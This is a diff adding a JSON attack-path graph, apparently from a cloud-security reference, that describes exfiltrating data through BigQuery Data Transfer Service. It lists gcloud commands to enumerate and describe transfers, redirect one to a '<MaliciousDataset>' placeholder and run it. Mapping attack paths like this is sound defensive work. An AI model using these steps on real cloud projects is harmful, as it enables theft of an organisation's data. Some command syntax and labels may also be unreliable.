@@ -1,0 +1,59 @@
+{
+    "title": "Exploit BigQuery Data Transfer Service for Data Exfiltration",
+    "icon": "https://img.icons8.com/?size=100&id=44471&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List Data Transfers",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "gcloud data-transfers list",
+                "description": "Lists all BigQuery data transfers in the specified GCP project.",
+                "services": ["BigQuery"],
+                "attack_types": ["Enumeration"],
+                "references": "https://cloud.google.com/sdk/gcloud/reference/data-transfers/list"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Describe Data Transfer",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/describe.png",
+            "details": {
+                "command": "gcloud data-transfers describe <TransferConfigName>",
+                "description": "Describes the specified BigQuery data transfer configuration.",
+                "services": ["BigQuery"],
+                "attack_types": ["Enumeration"],
+                "references": "https://cloud.google.com/sdk/gcloud/reference/data-transfers/describe"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Modify Data Transfer Destination",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/modify.png",
+            "details": {
+                "command": "gcloud data-transfers update <TransferConfigName> --destination-dataset=<MaliciousDataset>",
+                "description": "Modifies the BigQuery data transfer to send data to a malicious dataset.",
+                "services": ["BigQuery"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://cloud.google.com/sdk/gcloud/reference/data-transfers/update"
+            }
+        },
+        {
+            "id": 5,
+            "label": "Execute Data Transfer",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/execute.png",
+            "details": {
+                "command": "gcloud data-transfers start-manual <TransferConfigName>",
+                "description": "Executes the modified BigQuery data transfer to exfiltrate data.",
+                "services": ["BigQuery"],
+                "attack_types": ["Data Exfiltration"]
+            }
+        }
+    ]
+}
